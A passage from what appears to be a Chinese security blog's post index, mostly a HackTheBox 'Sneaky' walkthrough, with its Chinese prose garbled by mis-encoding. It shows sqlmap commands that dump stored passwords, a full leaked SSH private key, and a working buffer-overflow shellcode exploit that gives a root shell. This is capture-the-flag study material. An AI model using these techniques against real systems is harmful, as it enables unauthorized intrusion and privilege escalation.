boot&#x2F;vmlinuz-4.9.0-8-amd64lrwxrwxrwx 1 root root 26 Oct 28 2018 vmlinuz.old -&gt; boot&#x2F;vmlinuz-4.9.0-6-amd64giovanni@teacher:~&#x2F;work&#x2F;tmp$ ls -la &#x2F;root&#x2F;root.txtls -la &#x2F;root&#x2F;root.txt-rwxrwxrwx 1 root root 33 Jun 27 2018 &#x2F;root&#x2F;root.txt 0x04 CVE Analysis https://blog.ripstech.com/2018/moodle-remote-code-execution/ 0x05 Conclusion æ¸—é€è¿‡ç¨‹ï¼š 0x06 Reference https://ech1.netlify.com/htb/easy/26 https://blog.ripstech.com/2018/moodle-remote-code-execution/","tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"é¶æœº/HTB","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"}]},{"title":"HTB::Sneaky Walkthrough","date":"2020-03-21T13:13:17.000Z","path":"Target_drone/HackTheBox/7.HTB-Sneaky-walkthrough/","text":"ä¸å¾—ä¸è¯´è¿™ä¸ªé¶æœºçš„è´¨é‡éå¸¸é«˜ï¼Œå€¼å¾—ä¸€åšã€‚ï¼ˆå‡è£…å®‰æ…°ä¸€ä¸‹è‡ªå·±vipæ²¡æœ‰ç™½å……ï¼‰ HTB::Sneaky Walkthrough 0x01 Info Card 0x02 Prior knowledge IPv6 https://www.w3cschool.cn/ipv6/ipv6_address_types.html http://www.what21.com/sys/view/net_ipv6_1536653956137.html ä¸»è¦ææ¸…æ¥šIPv6çš„åœ°å€ç±»å‹å’Œæ ¼å¼ï¼Œä»¥åŠæœ¬æœºMacåœ°å€è½¬æ¢æˆæœ¬åœ°å”¯ä¸€åœ°å€çš„è®¡ç®—æ–¹æ³• SNMP https://www.manageengine.com/network-monitoring/what-is-snmp.html å¯¹äºSNMPåè®®ï¼Œä¸»è¦æ˜¯äº†è§£å®ƒçš„ç®¡ç†ä¿¡æ¯åº“(MIBï¼ŒManagement Information Base)å’Œå¯¹è±¡æ ‡è¯†ç¬¦(OIDï¼ŒObject ID)æ¦‚å¿µã€‚ç®¡ç†ä¿¡æ¯åº“ï¼ˆMIBï¼‰æ˜¯ç”¨äºç®¡ç†ç½‘ç»œå…ƒç´ çš„ä¿¡æ¯çš„é›†åˆï¼Œ ç”±å¯¹è±¡æ ‡è¯†ç¬¦ï¼ˆOIDï¼‰æ ‡è¯†çš„ç®¡ç†å¯¹è±¡ç»„æˆäº†ä¸‹é¢è¿™ç§æ ‘çŠ¶ç»“æ„ï¼š Buffer overflow 0x03 Tools and Tips nmap sqlmap snmpwalk OR snmp-check gdb Basic SQL Injection Enumerating SNMP Basic buffer overflow exploitation 0x04 Pentesting nmapæ‰«æé¶æœºç«¯å£ï¼š 1234567891011121314151617181920212223242526272829Nmap scan report for 10.10.10.20Host is up (0.28s latency).Not shown: 65534 closed portsPORT STATE SERVICE VERSION80&#x2F;tcp open http Apache httpd 2.4.7 ((Ubuntu))|_http-server-header: Apache&#x2F;2.4.7 (Ubuntu)|_http-title: Under Development!No exact OS matches for host (If you know what OS is running on it, see https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; ).TCP&#x2F;IP fingerprint:OS:SCAN(V&#x3D;7.80%E&#x3D;4%D&#x3D;3&#x2F;19%OT&#x3D;80%CT&#x3D;1%CU&#x3D;37304%PV&#x3D;Y%DS&#x3D;2%DC&#x3D;T%G&#x3D;Y%TM&#x3D;5E72D70OS:C%P&#x3D;i686-pc-windows-windows)SEQ(SP&#x3D;107%GCD&#x3D;1%ISR&#x3D;10D%TI&#x3D;Z%CI&#x3D;I%II&#x3D;I%TS&#x3D;8OS:)SEQ(CI&#x3D;I%II&#x3D;I)OPS(O1&#x3D;M54BST11NW7%O2&#x3D;M54BST11NW7%O3&#x3D;M54BNNT11NW7%O4&#x3D;M54BOS:ST11NW7%O5&#x3D;M54BST11NW7%O6&#x3D;M54BST11)WIN(W1&#x3D;7120%W2&#x3D;7120%W3&#x3D;7120%W4&#x3D;7120%WOS:5&#x3D;7120%W6&#x3D;7120)ECN(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;7210%O&#x3D;M54BNNSNW7%CC&#x3D;Y%Q&#x3D;)T1(R&#x3D;Y%DF&#x3D;YOS:%T&#x3D;40%S&#x3D;O%A&#x3D;S+%F&#x3D;AS%RD&#x3D;0%Q&#x3D;)T2(R&#x3D;N)T3(R&#x3D;N)T4(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;A%A&#x3D;Z%FOS:&#x3D;R%O&#x3D;%RD&#x3D;0%Q&#x3D;)T5(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;Z%A&#x3D;S+%F&#x3D;AR%O&#x3D;%RD&#x3D;0%Q&#x3D;)T6(R&#x3D;Y%DF&#x3D;Y%OS:T&#x3D;40%W&#x3D;0%S&#x3D;A%A&#x3D;Z%F&#x3D;R%O&#x3D;%RD&#x3D;0%Q&#x3D;)T7(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;Z%A&#x3D;S+%F&#x3D;AR%O&#x3D;%RDOS:&#x3D;0%Q&#x3D;)U1(R&#x3D;Y%DF&#x3D;N%T&#x3D;40%IPL&#x3D;164%UN&#x3D;0%RIPL&#x3D;G%RID&#x3D;G%RIPCK&#x3D;G%RUCK&#x3D;G%RUD&#x3D;G)IEOS:(R&#x3D;Y%DFI&#x3D;N%T&#x3D;40%CD&#x3D;S)Network Distance: 2 hopsTRACEROUTE (using port 21&#x2F;tcp)HOP RTT ADDRESS1 228.00 ms 10.10.16.12 296.00 ms 10.10.10.20OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 523.52 seconds è®¿é—®80ç«¯å£çš„ç«™ç‚¹ï¼š æ˜¯ä¸€ä¸ªé™æ€é¡µé¢ï¼Œç”¨dirsearchæ‰«æä¸€ä¸‹ç«™ç‚¹ç›®å½•ï¼š 12345678910111213141516171819202122232425262728293031323334Target: http:&#x2F;&#x2F;10.10.10.20&#x2F;[22:26:48] Starting: [22:26:55] 403 - 289B - &#x2F;.ht_wsr.txt[22:26:55] 403 - 282B - &#x2F;.hta[22:26:55] 403 - 293B - &#x2F;.htaccess-local[22:26:55] 403 - 293B - &#x2F;.htaccess-marco[22:26:55] 403 - 291B - &#x2F;.htaccess-dev[22:26:55] 403 - 291B - &#x2F;.htaccess.BAK[22:26:55] 403 - 292B - &#x2F;.htaccess.bak1[22:26:55] 403 - 291B - &#x2F;.htaccess.old[22:26:55] 403 - 294B - &#x2F;.htaccess.sample[22:26:55] 403 - 292B - &#x2F;.htaccess.orig[22:26:55] 403 - 291B - &#x2F;.htaccess.txt[22:26:55] 403 - 292B - &#x2F;.htaccess.save[22:26:55] 403 - 293B - &#x2F;.htaccess_extra[22:26:55] 403 - 292B - &#x2F;.htaccess_orig[22:26:55] 403 - 290B - &#x2F;.htaccessBAK[22:26:55] 403 - 290B - &#x2F;.htaccess_sc[22:26:55] 403 - 290B - &#x2F;.htaccessOLD[22:26:55] 403 - 288B - &#x2F;.htaccess~[22:26:55] 403 - 291B - &#x2F;.htaccessOLD2[22:26:55] 403 - 286B - &#x2F;.htgroup[22:26:55] 403 - 291B - &#x2F;.htpasswd-old[22:26:55] 403 - 292B - &#x2F;.htpasswd_test[22:26:55] 403 - 288B - &#x2F;.htpasswds[22:26:56] 403 - 286B - &#x2F;.htusers[22:28:10] 301 - 307B - &#x2F;dev -&gt; http:&#x2F;&#x2F;10.10.10.20&#x2F;dev&#x2F;[22:28:10] 200 - 464B - &#x2F;dev&#x2F;[22:28:30] 200 - 183B - &#x2F;index.html[22:29:14] 403 - 291B - &#x2F;server-status[22:29:14] 403 - 292B - &#x2F;server-status&#x2F;Task Completed å‘ç°äº†ä¸€ä¸ªdevè·¯å¾„ï¼Œæ˜¯ä¸€ä¸ªåå°ç™»å½•é¡µé¢ï¼Œç”¨ä¸‡èƒ½å¯†ç æ³¨å…¥è¯•ä¸€ä¸‹ï¼š æˆåŠŸç™»å½•ï¼š æœ‰ä¸€ä¸ªadminç”¨æˆ·ï¼Œè¿˜æœ‰ä¸€ä¸ªSSH keyï¼Œä½†æ˜¯æ²¡æœ‰ç«¯å£ç™»å½•ï¼š 123456789101112131415161718192021222324252627-----BEGIN RSA PRIVATE KEY-----MIIEowIBAAKCAQEAvQxBD5yRBGemrZI9F0O13j15wy9Ou8Z5Um2bC0lMdV9ckyU5Lc4V+rY81lS4cWUx&#x2F;EsnPrUyECJTtVXG1vayffJISugpon49LLqABZbyQzc4GgBr3mi0MyfiGRh&#x2F;Xr4L0+SwYdylkuX72E7rLkkigSt4s&#x2F;zXp5dJmL2RBZDJf1Qh6UgbyDxG2ER49&#x2F;wbdet8BKZ9EG7krGHgta4mfqrBbZiSBG1ST61VFC+G6v6GJQjC02cncb+zfPcTvcP0t63kdEreQbdASYK6&#x2F;e7Iih&#x2F;5eBy3i8YoNJd6Wr8&#x2F;qVtmB+FuxcFjoOqS9z0+G2keBfFlQzHttLr3mh70tgSA0fMKMwIDAQABAoIBAA23XOUYFAGAz7waNyp&#x2F;9CsaxMHfpdPD87uCTlSETfLaJ2pZsgtbv4aAQGvAm91GXVkTztYi6W34P6CRh6rDHXI76PjeXV73z9J1+aHuMMelswFX9Huflyt7AlGV0G&#x2F;8U&#x2F;lcx1tiWfUNkLdCCphCICnFEK3mc3Mqa+GUJ3iC58vAHAVUPIX&#x2F;cUcblPDdOmxvazpnP4PW1rEpW8cTOtsoA6quuPRn9O4vxDlaCdMYXfycNg6Uso0stD55tVTHcOz5MXIHh2rRKpl4817aI0wXr9nY7hr+ZzrN0xy5beZRqEIdaDnQG6qBJFeAOi2d7RSnSU6qH08wOPQnsmcBJkQxeUkCgYEA3RBR&#x2F;0MJErfUb0+vJgBCwhfjd0x094mfmovecplIUoiP9Aqh77iz5Kn4ABSCsfmiYf6kN8hhOzPAieARf5wbYhdjC0cxph7nI8P3Y6P9SrY3iFzQcpHYChzLrzkvV4wO+THz+QVLgmX3Yp1lmBYOSFwIirt&#x2F;MmoSaASbqpwhPSUCgYEA2uym+jZ9l84gdmLk7Z4LznJcvA54GBk6ESnPmUd8BArcYbla5jdSCNL4vfX3+ZaUsmgu7Z9lLVVv1SjCdpfFM79SqyxzwmclXuwknC2iHtHKDW5aiUMTG3io23K58VDS0VwCGR4wYcZF0iH&#x2F;t4tn02qqOPaRGJAB3BD&#x2F;B8bRxncCgYBI7hpvITl8EGOoOVyqJ8neaK0lbXblN2UNQnmnywP+HomHVH6qLIBEvwJPXHTlrFqzA6Q&#x2F;tv7E3kT195MuS10JVnfZf6pUiLtupDcYi0CEBmt5tE0cjxr78xYLf80rj8xcz+sSS3nm0ib0RMMAkr4xhxNWWZcUFcRuxp5ogcvBdQKBgQDB&#x2F;AYtGhGJbO1Y2WJOpseBY9aGEDAb8maAhNLd1&#x2F;iswE7tDMfdzFEVXpNoB0Z2UxZpS2WhyqZlWBoi&#x2F;93oJa1on&#x2F;QJlvbv4GO9y3LZLJpFwtDNu+XfUJ7irbS51tuqV1qmhmeZiCWIzZ5ahyPGqHEUZaR1mw2QfTIYpLrGUkbZGwKBgGMjAQBfLX0tpRCPyDNaLebFEmw4yIhB78ElGv6U1oY5qRE04kjHm1k&#x2F;Hu+up36u92YlaT7Yk+fsk&#x2F;k+IvCPum99pF3QR5SGIkZGIxczy7luxyxqDy3UfG31rOgybvKIVYntsE6raXfnYsEcvfbaE0BsREpcOGYpsE+i7xCRqdLb-----END RSA PRIVATE KEY----- ç”¨BurpSuiteæŠŠè¯·æ±‚æ•°æ®åŒ…ä¿å­˜æˆsneaky.reqæ–‡ä»¶ï¼Œå†ç”¨sqlmapè·‘ä¸€ä¸‹ï¼š 1234567891011121314151617181920212223242526$ sqlmap -r sneaky.req -p pass --dbms mysql --level 4 --risk 3 --dbs...[00:33:32] [INFO] fetching database namesavailable databases [4]:[*] dev[*] information_schema [*] mysql [*] performance_schema$ sqlmap -r sneaky.req -p pass --dbms mysql --level 4 --risk 3 -D &#39;dev&#39; --tables...$ sqlmap -r sneaky.req -p pass --dbms mysql --level 4 --risk 3 -D &#39;dev&#39; -T &#39;users&#39; --columns...$ sqlmap -r sneaky.req -p pass --dbms mysql --level 4 --risk 3 -D &#39;dev&#39; -T &#39;users&#39; -C &#39;name, pass&#39; --dump[00:38:48] [INFO] fetching entries of column(s) &#39;&#96;name&#96;, pass&#39; for table &#39;users&#39; in database &#39;dev&#39;Database: devTable: users[2 entries]+--------------+----------------------+| name | pass |+--------------+----------------------+| admin | sup3rstr0ngp4ssf0r4d || thrasivoulos | sup3rstr0ngp4ssf0r4d |+--------------+----------------------+ æ‰«å‡ºäº†ä¸¤ä¸ªç”¨æˆ·ï¼Œæ²¡å•¥æ€è·¯äº†ï¼Œçœ‹ä¸€ä¸‹writeupæç¤ºï¼Œå¥½å§ï¼Œè¿˜è¦æ‰«æUDPç«¯å£ï¼Œ161ç«¯å£ä¸Šè¿è¡ŒsnmpæœåŠ¡ï¼š 123456789101112131415161718192021PORT STATE SERVICE VERSION161&#x2F;udp open snmp SNMPv1 server; net-snmp SNMPv3 server (public)| snmp-info:| enterprise: net-snmp| engineIDFormat: unknown| engineIDData: fcf2da02d0831859| snmpEngineBoots: 8|_ snmpEngineTime: 6h24m47s| snmp-interfaces:| lo| IP address: 127.0.0.1 Netmask: 255.0.0.0| Type: softwareLoopback Speed: 10 Mbps| Traffic stats: 9.74 Kb sent, 9.74 Kb received| eth0| IP address: 10.10.10.20 Netmask: 255.255.255.0| MAC address: 00:50:56:b9:37:ed (VMware)| Type: ethernetCsmacd Speed: 4 Gbps|_ Traffic stats: 7.92 Mb sent, 7.47 Mb received| snmp-netstat:| TCP 127.0.0.1:3306 0.0.0.0:0|_ UDP 0.0.0.0:161 *:* æ—¢ç„¶IPv4çš„é˜²ç«å¢™æ²¡æœ‰å¼€æ”¾22ç«¯å£ï¼Œæ¢ä¸ªæ€è·¯çœ‹ä¸€ä¸‹IPv6çš„ç«¯å£å¼€æ”¾æƒ…å†µï¼Œå‰æå°±æ˜¯æˆ‘ä»¬çŸ¥é“é¶æœºçš„IPv6æœ¬åœ°å”¯ä¸€åœ°å€ï¼ˆç±»ä¼¼IPv6çš„å†…ç½‘/ç§ç½‘åœ°å€ï¼‰ï¼Œè¿™é‡Œå°±è¦åˆ©ç”¨SNMPæœåŠ¡ã€‚ ä½¿ç”¨snmpwalkå·¥å…·æ‰«æé¶æœºä¸Šçš„è®¾å¤‡ï¼š 1snmpwalk -v2c -c public 10.10.10.20 &gt; sneakly.snmp æ‰“å¼€æ–‡ä»¶ä¹‹åç›´æ¥å…¨å±€æœç´¢10.10.10.20ï¼š æˆ‘ä»¬å°±èƒ½æ‰¾åˆ°é¶æœºçš„IPv6åœ°å€(åè¿›åˆ¶è¡¨ç¤º) iso.3.6.1.2.1.4.34.1.4.2.16. è®¾å¤‡çš„OIDå· è½¬æ¢æˆåå…­è¿›åˆ¶è¡¨ç¤º 1dead:beef::0250:56ff:feb9:2771 å½“ç„¶ï¼Œæˆ‘ä¸€å¼€å§‹æ‰“å¼€è¿™ä¸ªæ–‡ä»¶ä¹Ÿæ˜¯ä¸€è„¸æ‡µé€¼çš„çŠ¶æ€ï¼Œå®Œå…¨ä¸çŸ¥é“è¾“å‡ºçš„æ˜¯ä»€ä¹ˆæ„æ€ï¼Œæˆ‘ä»¬å¯ä»¥é€‚å½“çš„è®©snmpwalkè¾“å‡ºçš„å†…å®¹æ›´åŠ å¯è¯»ï¼š 12345# å®‰è£…è½¯ä»¶sudo apt-get install snmp-mibs-downloader# ç¼–è¾‘æ–‡ä»¶ï¼Œæ³¨é‡Šæ‰mibs:è¿™ä¸€è¡Œvim &#x2F;etc&#x2F;snmp&#x2F;snmp.conf æˆ‘ä»¬å†æ‰§è¡Œsnmpwalkå‘½ä»¤ï¼Œè¿™ä¸€æ¬¡å¯ä»¥å†åŠ ä¸€ä¸ªOIDå‚æ•°å‡å°‘è¾“å‡ºçš„å†…å®¹ 1234$ snmpwalk -v2c -c public 10.10.10.20 1.3.6.1.2.1.4.34.1.4.2.16IP-MIB::ipAddressType.ipv6.&quot;00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:01&quot; &#x3D; INTEGER: unicast(1)IP-MIB::ipAddressType.ipv6.&quot;de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:27:71&quot; &#x3D; INTEGER: unicast(1)IP-MIB::ipAddressType.ipv6.&quot;fe:80:00:00:00:00:00:00:02:50:56:ff:fe:b9:27:71&quot; &#x3D; INTEGER: unicast(1) æ•´ç†ä¸€ä¸‹å’Œåˆšåˆšå¾—åˆ°çš„åœ°å€æ˜¯ä¸€æ ·çš„ã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨é¶æœºä½œè€…å†™çš„ä¸€ä¸ªPythonè„šæœ¬å¾—åˆ°é¶æœºçš„IPv6åœ°å€ï¼Œä¼ é€é—¨ğŸšª æ³¨æ„ï¼Œè¦æŠŠ/etc/snmp/snmp.confæ–‡ä»¶æ”¹å›æ¥ï¼Œä¸ç„¶ä¼šè¿è¡ŒæŠ¥é”™ 123456789101112131415161718192021222324252627$ nmap -sV -A -6 dead:beef::0250:56ff:feaa:0b69Starting Nmap 7.50 ( https:&#x2F;&#x2F;nmap.org ) at 2017-07-30 22:11 ISTNmap scan report for dead:beef::250:56ff:feaa:b69Host is up (0.14s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 1024 5d:5d:2a:97:85:a1:20:e2:26:e4:13:54:58:d6:a4:22 (DSA)| 2048 a2:00:0e:99:0f:d3:ed:b0:19:d4:6b:a8:b1:93:d9:87 (RSA)| 256 e3:29:c4:cb:87:98:df:99:6f:36:9f:31:50:e3:b9:42 (ECDSA)|_ 256 e6:85:a8:f8:62:67:f7:01:28:a1:aa:00:b5:60:f2:21 (EdDSA)80&#x2F;tcp open http Apache httpd 2.4.7 ((Ubuntu))|_http-server-header: Apache&#x2F;2.4.7 (Ubuntu)|_http-title: 400 Bad RequestService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernelHost script results:| address-info: | IPv6 EUI-64: | MAC address: | address: 00:50:56:aa:0b:69|_ manuf: VMwareService detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 35.18 seconds å†ç”¨ä¹‹å‰å¾—åˆ°çš„SSH keyç™»å½•é¶æœºï¼Œæ‹¿åˆ°user.txtï¼š 1234567891011121314151617181920212223Î» ssh -6 -i sneaky.key thrasivoulos@dead:beef::0250:56ff:feb9:2771The authenticity of host &#39;dead:beef::250:56ff:feb9:2771 (dead:beef::250:56ff:feb9:2771)&#39; can&#39;t be established.ECDSA key fingerprint is SHA256:KCwXgk+ryPhJU+UhxyHAO16VCRFrty3aLPWPSkq&#x2F;E2o.Are you sure you want to continue connecting (yes&#x2F;no)? yesWarning: Permanently added &#39;dead:beef::250:56ff:feb9:2771&#39; (ECDSA) to the list of known hosts.Welcome to Ubuntu 14.04.5 LTS (GNU&#x2F;Linux 4.4.0-75-generic i686) * Documentation: https:&#x2F;&#x2F;help.ubuntu.com&#x2F; System information as of Fri Mar 20 08:31:46 EET 2020 System load: 0.0 Processes: 160 Usage of &#x2F;: 9.9% of 18.58GB Users logged in: 0 Memory usage: 10% IP address for eth0: 10.10.10.20 Swap usage: 0% Graph this data and manage this system at: https:&#x2F;&#x2F;landscape.canonical.com&#x2F;Your Hardware Enablement Stack (HWE) is supported until April 2019.Last login: Fri Mar 20 08:31:47 2020 from dead:beef:4::1057thrasivoulos@Sneaky:~$ lsuser.txt æ£€æŸ¥suidæ–‡ä»¶ 12345678910111213141516171819202122thrasivoulos@Sneaky:~$ find &#x2F; -perm -4000 -user root -exec ls -ld &#123;&#125; \\; 2&gt;&#x2F;dev&#x2F;null;-rwsr-xr-x 1 root root 67704 Nov 24 2016 &#x2F;bin&#x2F;umount-rwsr-xr-x 1 root root 35300 May 4 2017 &#x2F;bin&#x2F;su-rwsr-xr-x 1 root root 88752 Nov 24 2016 &#x2F;bin&#x2F;mount-rwsr-xr-x 1 root root 43316 May 8 2014 &#x2F;bin&#x2F;ping6-rwsr-xr-x 1 root root 30112 May 15 2015 &#x2F;bin&#x2F;fusermount-rwsr-xr-x 1 root root 38932 May 8 2014 &#x2F;bin&#x2F;ping-rwsrwsr-x 1 root root 7301 May 4 2017 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;chal-rwsr-xr-- 1 root dip 323000 Apr 21 2015 &#x2F;usr&#x2F;sbin&#x2F;pppd-rwsr-xr-x 1 root root 18168 Nov 24 2015 &#x2F;usr&#x2F;bin&#x2F;pkexec-rwsr-xr-x 1 root root 18136 May 8 2014 &#x2F;usr&#x2F;bin&#x2F;traceroute6.iputils-rwsr-xr-x 1 root root 35916 May 4 2017 &#x2F;usr&#x2F;bin&#x2F;chsh-rwsr-xr-x 1 root root 66284 May 4 2017 &#x2F;usr&#x2F;bin&#x2F;gpasswd-rwsr-xr-x 1 root root 45420 May 4 2017 &#x2F;usr&#x2F;bin&#x2F;passwd-rwsr-xr-x 1 root root 72860 Oct 21 2013 &#x2F;usr&#x2F;bin&#x2F;mtr-rwsr-xr-x 1 root root 30984 May 4 2017 &#x2F;usr&#x2F;bin&#x2F;newgrp-rwsr-xr-x 1 root root 156708 Oct 14 2016 &#x2F;usr&#x2F;bin&#x2F;sudo-rwsr-xr-x 1 root root 44620 May 4 2017 &#x2F;usr&#x2F;bin&#x2F;chfn-rwsr-xr-- 1 root messagebus 333952 Dec 7 2016 &#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper-rwsr-xr-x 1 root root 492972 Aug 11 2016 &#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign-rwsr-xr-x 1 root root 9808 Nov 24 2015 &#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1-rwsr-xr-x 1 root root 5480 Mar 27 2017 &#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device å‘½ä»¤è§£é‡Šï¼š -perm -4000 åˆ—å‡ºæ‹¥æœ‰setuidå±æ€§çš„æ–‡ä»¶å’Œç›®å½• -user root æ–‡ä»¶æˆ–ç›®å½•æ‰€æœ‰è€…å±äºroot -exec ls -ld {} \\ å¯¹ä¹‹å‰åˆ—å‡ºçš„æ–‡ä»¶ç›®å½•å†æ‰§è¡Œls -ldå‘½ä»¤ 2&gt;/dev/null å°†æ ‡å‡†é”™è¯¯è¾“å‡ºstderråˆ æ‰ æŸ¥çœ‹/usr/local/bin/chalæ–‡ä»¶ 12thrasivoulos@Sneaky:~$ file &#x2F;usr&#x2F;local&#x2F;bin&#x2F;chal&#x2F;usr&#x2F;local&#x2F;bin&#x2F;chal: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU&#x2F;Linux 2.6.24, BuildID[sha1]&#x3D;fc8ad06fcfafe1fbc2dbaa1a65222d685b047b11, not stripped å¥½äº†ï¼Œä»è¿™é‡Œå¼€å§‹å°±åˆ°äº†æˆ‘çš„çŸ¥è¯†ç›²åŒºäº†ï¼Œæ¶‰åŠåˆ°æ ˆæº¢å‡ºæ¼æ´çš„åˆ©ç”¨ï¼Œåªèƒ½è·Ÿç€å¤§ä½¬ä¸€æ­¥ä¸€æ­¥çš„æ¥ã€‚ Shellcodeï¼šhttp://shell-storm.org/shellcode/files/shellcode-811.php 1\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80 12345thrasivoulos@Sneaky:&#x2F;usr&#x2F;local&#x2F;bin$ .&#x2F;chal $(python -c &#39;print &quot;\\x90&quot;*330 +&quot;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80&quot; + &quot;\\x42\\xf4\\xff\\xbf&quot;*30&#39;)# iduid&#x3D;1000(thrasivoulos) gid&#x3D;1000(thrasivoulos) euid&#x3D;0(root) egid&#x3D;0(root) groups&#x3D;0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare),1000(thrasivoulos)# cat &#x2F;root&#x2F;root.txtc515[----------------------------]fb33 0x05 Summary Sneakyæ˜¯ä¸€ä¸ª2017å¹´çš„é¶æœºï¼Œè¯„åˆ†5åˆ†ï¼Œä¸å¾—ä¸è¯´è´¨é‡éå¸¸é«˜ã€‚æ‰«æå¸¸è§„çš„TCPç«¯å£å’Œç½‘ç«™è·¯å¾„åï¼Œç”¨åŸºæœ¬çš„SQLæ³¨å…¥æ‹¿åˆ°ç”¨æˆ·åå’ŒSSH keyï¼Œä½†æ˜¯ç°åœ¨é‡åˆ°äº†æ²¡æœ‰å¼€æ”¾22ç«¯å£çš„é—®é¢˜ï¼Œç´§æ¥ç€å»æ‰«æUDPç«¯å£ï¼Œå‘ç°è¿è¡Œäº†SNMPæœåŠ¡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨snmpwalkå·¥å…·é€šè¿‡GETNEXTè¯·æ±‚æŸ¥è¯¢æŒ‡å®šOIDå…¥å£çš„æ‰€æœ‰OIDæ ‘ä¿¡æ¯ï¼Œç”±æ­¤è·å¾—äº†é¶æœºäº†IPv6çš„åœ°å€ï¼Œnmapæ‰«æåå‘ç°å¼€æ”¾äº†SSH 22ç«¯å£ã€‚ä½†æ˜¯ææƒrootç”¨åˆ°äº†æ ˆæº¢å‡ºçš„çŸ¥è¯†ç‚¹ï¼Œç¡®å®æ²¡ä»€ä¹ˆåŸºç¡€ï¼Œçœ‹èµ·æ¥æœ‰ç‚¹åƒåŠ›ï¼Œå…ˆmarkï¼Œä¸‹æ¬¡æœ‰æ—¶é—´å†ç ”ç©¶ä¸€ä¸‹ã€‚ 0x06 Reference https://www.youtube.com/watch?v=1UGxjqTnuyo&amp;feature=youtu.be https://s1gh.sh/hackthebox-sneaky-walkthrough/ https://hkh4cks.com/blog/2017/12/30/htb-sneaky-walkthrough/ https://www.hackingarticles.in/hack-the-box-challenge-sneaky-walkthrough/","tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"é¶æœº/HTB","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"}]},{"title":"HTB::Tenten Walkthrough","date":"2020-03-18T15:57:20.000Z","path":"Target_drone/HackTheBox/6.HTB-Tenten-walkthrough/","text":"HTB::Tenten Walkthrough 0x01 Information 0x02 Tools and Tis nmap wpscan JohnTheRipper steghide wordpress job-manager plugin 0x03 Pentesting nmapæ‰«æé¶æœºç«¯å£ï¼š 1234567891011121314151617181920212223242526Nmap scan report for 10.10.10.10Host is up (0.23s latency).Not shown: 65533 filtered portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)| 256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)|_ 256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-generator: WordPress 4.7.3|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)|_http-title: Job Portal &amp;#8211; Just another WordPress siteWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.2 - 4.9 (92%), Linux 4.2 (92%), Linux 4.4 (92%), Linux 4.8 (92%), Linux 4.9 (91%), Linux 3.12 (90%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernelTRACEROUTE (using port 80&#x2F;tcp)HOP RTT ADDRESS1 237.00 ms 10.10.16.12 309.00 ms 10.10.10.10OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 541.37 seconds ä¸€çœ‹80ç«¯å£è¿è¡Œwordpressç«™ç‚¹ï¼Œä¸å¤šBBï¼Œç›´æ¥ä¸Šwpscanå·¥å…·æ‰«æï¼š 